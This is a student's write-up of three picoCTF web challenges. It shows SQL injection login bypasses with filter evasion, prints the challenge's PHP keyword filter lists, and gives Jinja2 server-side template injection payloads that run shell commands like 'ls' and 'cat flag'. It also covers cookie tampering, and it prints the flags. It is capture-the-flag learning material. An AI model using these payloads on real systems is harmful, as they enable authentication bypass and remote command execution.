# 1. Web Gauntlet

As soon as i opened the challenge  i got links of 2 websites 1 had the login page and the other page had a set of instructions that apparently changed after each round.
### Round 1:`admin'--`

filters: `or`

The `'` character acts a string delimiter and escapes the username string and it allows any other command to be run. Here `--` is a comment, which comments out `AND password=''`. Which means, any password will work.  

### Round 2: `admin'/*`

filters: `or like and = --`

As `--` was filtered out, we can use `/*` as an alternative to comment out the rest of the query .

### Round 3: `admin'/*`

filters: `or and = like > < --`

The query for this is same as above.

### Round 4: `adm'||'in/*`

filters: `or and = like > < -- admin`

Here, the word `admin` was blocked, so what I can do is, break it into two parts and concatenate it using the relevant operators. 
`||` is used to concatenate two strings.   

### Round 5: `adm'||'in/*`

filters: `or and = like > < -- admin union`

Query is Same as above.

This is what I got in the `http://shape-facility.picoctf.net:61909/filter.php` after completing all 5 rounds: 

```<?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_79a0ddc6}
?>
```

# Flag: `picoCTF{y0u_m4d3_1t_79a0ddc6}`


## 2. SSTI1

 The first thing I did, was opening up the inspector in my firefox window and looking at the network section. 
 In there, I looked at the `GET` request
Through which I could see that the server was running python.
		
 Then looking at one of the hints, I could identify that the attack used here was `Server Side Template Injection`, having no prior knowledge regarding this, I searched up "python server side template injection" on google.
 I landed on a website called "yeswehack.com", and it listed common `SSTI` attacks and the first one for python's `jinja2` which is the default template engine in `Flask`. 
 I sent the first payload given `{{self.__init__.__globals__.__str__()[1786:1789]}}` which actually worked and printed `id` as said on the website.
 I modified the second payload given which was to run a system command to list all the files in the current working directory. The command used was `{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls").read()}}`
  
 So there was a file called `flag` in the same directory, again running the same injection but this time using `cat flag`, I was able to get the flag. `{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat flag").read()}}`

## Flag: `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}`



# 3.Cookies


This challenge was rather easier but i feel this is not the right way to do it but anyways, I'll explain my complete thought process, so after clicking on the link I got the following web page opened:


Then I just started trying filling in input, wrote `snickerdoodle` first printed out the following:


Then tried a few more ccokie derivatives trying to get to the right one but all were invalid ,then i decide to click inspect->Application->Cookies
after seeing a table with name written and a number in front of it i double clicked on that bar and edited the value to 0, which brought me back to the original page
after which i figured out that depending on the number contents on my screen would change.
i tried  0,10,20 numbers in this pattern and i found out that by putting 30 i would get cookie name as invalid so i kept trying and at number 18 i found out the contents on my screen revealed the flag



# Flag
`picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}`


